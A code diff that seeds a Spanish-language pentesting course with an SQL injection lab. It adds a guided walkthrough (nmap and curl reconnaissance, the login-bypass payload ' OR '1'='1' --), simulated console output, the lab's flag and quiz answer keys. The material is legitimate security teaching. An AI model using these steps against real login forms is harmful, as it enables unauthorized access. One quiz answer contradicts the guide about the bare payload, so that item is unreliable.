@@ -31,6 +31,8 @@ plantilla ni la copia del instructor (aunque sí puede seguir intentando
 invitar/aceptar si esos pasos anteriores no llegaron a completarse).
 """
 
+from datetime import datetime, timedelta, timezone
+
 from django.contrib.auth.hashers import make_password
 from django.core.management.base import BaseCommand
 
@@ -64,7 +66,11 @@ from modules.laboratories.application.use_cases.duplicar_laboratorio import (
 from modules.laboratories.application.use_cases.publicar_laboratorio import (
     PublicarLaboratorioUseCase,
 )
-from modules.laboratories.domain.value_objects import TipoLaboratorio
+from modules.laboratories.domain.value_objects import (
+    ComandoSimulado,
+    EntornoPractica,
+    TipoLaboratorio,
+)
 from modules.laboratories.infrastructure.repositories import LaboratorioRepository
 from modules.progress.infrastructure.repositories import ProgresoRepository
 from modules.shared.domain.exceptions import DomainError
@@ -197,11 +203,35 @@ class Command(BaseCommand):
                 laboratorio_id=laboratorio.id,
                 titulo="Introducción a SQL Injection",
                 contenido_teorico=(
-                    "<p>SQL Injection ocurre cuando la entrada de un usuario se concatena "
-                    "directamente en una consulta SQL sin sanitizar. Esto permite alterar la "
-                    "lógica de la consulta original.</p><p>En este laboratorio vas a explotar "
-                    "un formulario de login vulnerable para autenticarte sin conocer una "
-                    "contraseña válida.</p>"
+                    "<h3>¿Qué es SQL Injection?</h3>"
+                    "<p>SQL Injection (SQLi) es una de las vulnerabilidades web más antiguas y "
+                    "todavía una de las más comunes (OWASP Top 10, categoría A03:2021 — "
+                    "Injection). Ocurre cuando la entrada de un usuario se concatena "
+                    "<em>directamente</em> en una consulta SQL sin sanitizar ni parametrizar, "
+                    "permitiendo que ese usuario altere la lógica de la consulta original.</p>"
+                    "<h3>Un ejemplo mínimo</h3>"
+                    "<p>Un formulario de login típico, mal implementado, arma la consulta así:</p>"
+                    "<pre>query = \"SELECT * FROM users WHERE username = '\" + user_input "
+                    "+ \"' AND password = '\" + pass_input + \"'\"</pre>"
+                    "<p>Si <code>user_input</code> se toma tal cual del formulario, un atacante "
+                    "puede escribir algo que ya no sea solo \"un nombre de usuario\", sino código "
+                    "SQL adicional que cambia el significado completo de la consulta.</p>"
+                    "<h3>Impacto real</h3>"
+                    "<ul>"
+                    "<li>Bypass de autenticación (lo que vas a hacer en este laboratorio).</li>"
+                    "<li>Exfiltración de datos de toda la base (usuarios, contraseñas, tarjetas).</li>"
+                    "<li>Modificación o borrado de datos.</li>"
+                    "<li>En algunos motores, incluso ejecución de comandos en el servidor.</li>"
+                    "</ul>"
+                    "<h3>Cómo se previene</h3>"
+                    "<p>La defensa correcta es usar <strong>consultas parametrizadas / prepared "
+                    "statements</strong>, donde el motor de base de datos trata la entrada del "
+                    "usuario siempre como dato, nunca como código — nunca concatenar strings para "
+                    "construir SQL.</p>"
+                    "<p>En este laboratorio vas a explotar un formulario de login vulnerable para "
+                    "autenticarte sin conocer una contraseña válida, usando la consola de práctica "
+                    "de la siguiente sección. No hace falta que instales nada: es un entorno "
+                    "simulado, pensá los comandos como si estuvieras frente a una term real.</p>"
                 ),
                 orden=1,
                 actor_id=admin.id,
@@ -215,16 +245,138 @@ class Command(BaseCommand):
                 laboratorio_id=laboratorio.id,
                 titulo="Bypass de login vulnerable",
                 contenido_teorico=(
-                    "<p>El siguiente formulario ejecuta una consulta similar a:</p>"
+                    "<h3>El objetivo</h3>"
+                    "<p>Tenés acceso a una consola de práctica contra una máquina objetivo "
+                    "(<code>192.168.56.10</code>) que expone un formulario de login en "
+                    "<code>/login.php</code>. El backend arma la consulta de autenticación así:</p>"
                     "<pre>SELECT * FROM users WHERE username = '&lt;input&gt;' "
                     "AND password = '&lt;input&gt;'</pre>"
-                    "<p>Encontrá una entrada que altere la lógica de la consulta para "
-                    "autenticarte sin conocer la contraseña real.</p>"
+                    "<h3>Tu misión</h3>"
+                    "<p>Encontrá una entrada que altere la lógica de esa consulta para "
+                    "autenticarte <strong>sin conocer la contraseña real</strong> de ningún "
+                    "usuario. Usá la consola de la derecha para explorar el objetivo — probá "
+                    "reconocimiento, mirá el formulario, y experimentá con el campo usuario.</p>"
+                    "<p>Cuando la consola te devuelva la flag, copiala y pegala en el campo de "
+                    "abajo para marcar la sección como resuelta.</p>"
+                    "<p>Tenés la guía paso a paso disponible arriba si preferís seguir una "
+                    "metodología guiada en vez de explorar a ciegas — podés abrirla en una "
+                    "pestaña aparte y dejarla abierta mientras trabajás acá.</p>"
                 ),
                 orden=2,
                 actor_id=admin.id,
                 actor_rol="administrador",
                 tiene_practica=True,
+                guia_paso_a_paso=(
+                    "<h3>Metodología sugerida</h3>"
+                    "<p>Este es el mismo proceso que seguirías en un engagement real de pentesting "
+                    "web, simplificado para el laboratorio.</p>"
+                    "<h4>1. Reconocimiento</h4>"
+                    "<p>Escaneá el objetivo para confirmar qué servicios están expuestos:</p>"
+                    "<pre>nmap -sV 192.168.56.10</pre>"
+                    "<h4>2. Inspeccioná el formulario</h4>"
+                    "<p>Traé el HTML de la página de login para entender los campos del "
+                    "formulario y el método de envío:</p>"
+                    "<pre>curl -s http://192.168.56.10/login.php</pre>"
+                    "<h4>3. Confirmá el punto de inyección</h4>"
+                    "<p>A veces hay pistas en archivos de backup o configuración mal protegidos:</p>"
+                    "<pre>ls\ncat config.php.bak</pre>"
+                    "<h4>4. Construí el payload</h4>"
+                    "<p>El objetivo es que la cláusula <code>WHERE</code> se evalúe siempre como "
+                    "verdadera, sin importar la contraseña. Un primer intento razonable como "
+                    "usuario sería:</p>"
+                    "<pre>' OR '1'='1</pre>"
+                    "<p>Pero ojo: el backend concatena <em>también</em> la condición de "
+                    "contraseña con <code>AND</code>, y en SQL <code>AND</code> se evalúa antes "
+                    "que <code>OR</code>. La consulta resultante queda (conceptualmente):</p>"
+                    "<pre>SELECT * FROM users WHERE username = '' OR '1'='1' "
+                    "AND password = '...'</pre>"
+                    "<p>Eso se interpreta como <code>username='' OR ('1'='1' AND "
+                    "password='...')</code> — como la contraseña que mandaste seguro no coincide, "
+                    "¡el bypass falla! Para neutralizar la comparación de contraseña, "
+                    "agregá un comentario SQL (<code>-- </code>, con un espacio después) al final "
+                    "del username: todo lo que venga después se ignora.</p>"
+                    "<pre>' OR '1'='1' -- </pre>"
+                    "<h4>5. Enviá el payload</h4>"
+                    "<pre>curl -s http://192.168.56.10/login.php "
+                    "--data-urlencode \"username=' OR '1'='1' -- \" "
+                    "--data-urlencode 'password=x'</pre>"
+                    "<h4>6. Capturá la flag</h4>"
+                    "<p>La respuesta del servidor va a incluir la flag. Copiala tal cual "
+                    "(formato <code>FLAG{...}</code>) y pegala en el campo de envío de esta "
+                    "sección.</p>"
+                    "<blockquote>Tip: si algo no funciona, revisá que estés usando comillas "
+                    "simples exactamente como se muestra — es la parte más común de errar al "
+                    "tipear el payload a mano.</blockquote>"
+                ),
+                entorno_practica=EntornoPractica(
+                    prompt="estudiante@labs:~$",
+                    banner=(
+                        "Conectado a la máquina objetivo (192.168.56.10).\n"
+                        "Consola de práctica simulada — no ejecuta comandos reales contra "
+                        "ningún sistema.\n"
+                        "Escribí 'help' para ver los comandos sugeridos."
+                    ),
+                    comandos=[
+                        ComandoSimulado(
+                            comando="nmap -sV 192.168.56.10",
+                            salida=(
+                                "Starting Nmap 7.94 ( https://nmap.org )\n"
+                                "Nmap scan report for 192.168.56.10\n"
+                                "PORT   STATE SERVICE VERSION\n"
+                                "22/tcp open  ssh     OpenSSH 8.9\n"
+                                "80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n"
+                                "Service Info: OS: Linux\n"
+                                "\nNmap done: 1 IP address (1 host up) scanned"
+                            ),
+                        ),
+                        ComandoSimulado(
+                            comando="curl -s http://192.168.56.10/login.php",
+                            salida=(
+                                "<form method=\"POST\" action=\"/login.php\">\n"
+                                "  <input type=\"text\" name=\"username\" placeholder=\"usuario\">\n"
+                                "  <input type=\"password\" name=\"password\" placeholder=\"contraseña\">\n"
+                                "  <button type=\"submit\">Ingresar</button>\n"
+                                "</form>\n"
+                                "<!-- TODO: sacar config.php.bak del server antes de producción -->"
+                            ),
+                        ),
+                        ComandoSimulado(
+                            comando="ls",
+                            salida="login.php\nconfig.php.bak\nstyle.css",
+                        ),
+                        ComandoSimulado(
+                            comando="cat config.php.bak",
+                            salida=(
+                                "<?php\n"
+                                "// backup viejo, no debería estar accesible\n"
+                                "$query = \"SELECT * FROM users WHERE username = '\" . "
+                                "$_POST['username'] . \"' AND password = '\" . "
+                                "$_POST['password'] . \"'\";\n"
+                                "// ver login.php para la version actual\n"
+                                "?>"
+                            ),
+                        ),
+                        ComandoSimulado(
+                            comando="whoami",
+                            salida="estudiante",
+                        ),
+                        ComandoSimulado(
+                            comando="curl -s http://192.168.56.10/login.php --data-urlencode \"username=' OR '1'='1' -- \" --data-urlencode 'password=x'",
+                            salida=(
+                                "HTTP/1.1 200 OK\n"
+                                "<div class=\"success\">\n"
+                                "  Bienvenido, admin. Autenticación bypassed.\n"
+                                "  FLAG{sql_injection_1s_ez}\n"
+                                "</div>"
+                            ),
+                        ),
+                    ],
+                ),
+                # Entorno REAL además de la consola simulada de arriba — mismo
+                # bypass, pero esta vez contra una app Python real corriendo
+                # dentro de un contenedor descartable por estudiante
+                # (lab_environments). Ver docker/targets/sqli-login/.
+                imagen_practica="platlab-target-sqli:latest",
             )
         )
 
@@ -237,8 +389,9 @@ class Command(BaseCommand):
                 actor_rol="administrador",
                 pista="Probá con una comilla simple (') en el campo de usuario y mirá qué pasa.",
                 paso_a_paso=(
-                    "Ingresá  ' OR '1'='1  como usuario y cualquier valor como contraseña. "
-                    "La flag es FLAG{sql_injection_1s_ez}."
+                    "Usá  ' OR '1'='1' --  (con el espacio final) como usuario y cualquier "
+                    "valor como contraseña — el comentario SQL al final neutraliza la "
+                    "verificación de contraseña. La flag es FLAG{sql_injection_1s_ez}."
                 ),
             )
         )
@@ -321,6 +474,43 @@ class Command(BaseCommand):
                 actor_rol="instructor",
             )
         )
+        AgregarPreguntaUseCase(**kwargs).execute(
+            AgregarPreguntaDTO(
+                laboratorio_id=resultado.id,
+                enunciado="¿A qué categoría del OWASP Top 10 (2021) pertenece SQL Injection?",
+                tipo="opcion_multiple",
+                respuesta="A03:2021 - Injection",
+                actor_id=instructor.id,
+                actor_rol="instructor",
+                opciones=[
+                    "A01:2021 - Broken Access Control",
+                    "A03:2021 - Injection",
+                    "A05:2021 - Security Misconfiguration",
+                    "A07:2021 - Identification and Authentication Failures",
+                ],
+            )
+        )
+        AgregarPreguntaUseCase(**kwargs).execute(
+            AgregarPreguntaDTO(
+                laboratorio_id=resultado.id,
+                enunciado=(
+                    "El payload  ' OR '1'='1  funciona en el login del laboratorio porque..."
+                ),
+                tipo="opcion_multiple",
+                respuesta="La condición '1'='1' siempre es verdadera, cumpliendo el WHERE sin conocer la contraseña real",
+                actor_id=instructor.id,
+                actor_rol="instructor",
+                opciones=[
+                    "Porque el servidor tiene un firewall mal configurado",
+                    (
+                        "La condición '1'='1' siempre es verdadera, cumpliendo el WHERE sin "
+                        "conocer la contraseña real"
+                    ),
+                    "Porque el password se envía sin cifrar",
+                    "Porque el servidor no tiene certificado HTTPS",
+                ],
+            )
+        )
 
         return laboratorio_repository.get_by_id(resultado.id)
 
@@ -344,6 +534,7 @@ class Command(BaseCommand):
                 estudiantes=[str(estudiante.email)],
                 actor_id=instructor.id,
                 actor_rol="instructor",
+                fecha_vencimiento=datetime.now(timezone.utc) + timedelta(days=30),
             )
         )
 
